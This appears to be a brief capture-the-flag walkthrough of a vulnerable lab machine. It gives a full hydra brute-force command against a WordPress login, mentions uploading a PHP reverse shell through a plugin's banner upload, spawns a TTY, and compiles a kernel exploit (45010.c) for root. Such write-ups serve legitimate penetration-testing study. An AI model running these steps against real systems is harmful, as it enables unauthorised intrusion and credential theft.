Run nmap scan on given IP address
Only port 80 is open

Run feroxbuster as main webpage is nginx default page.
`http://192.168.115.121 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`

Discover `loly.lc/wordpress`. Add loly.lc into /etc/hosts.
Ran wpscan but nothing. Could it be a bug?

Saw a wp-login website and ran several default credentials against it. Try loly as username and a unique error message came up.
Run burpsuite. Capture http-post-form format.

Proceed to crack with hydra 
```
hydra -l loly -P /usr/share/wordlists/rockyou.txt loly.lc http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Floly.lc%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect"
```
password fernando acquired

Use it to login and upload reversephpshell zip from pentestmonkey in the adrotate banner section. Run a listener and go to banner/reversephpshell.sh.

Acquired initial foothold. Make sure to have TTY functionality.
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

Copy linpeas to victim tmp folder, chmod +x, and run. Discover a password lolyisabeautifulgirl.`su loly`

Run `cat /etc/*-release` and `uname -mrs` to learn OS version
Find a kernel exploit 45010.c.
`gcc -static 45010.c -o aaaa -lpthread -lcrypt`
Copy to victim computer, chmod +x and run. Gain root.





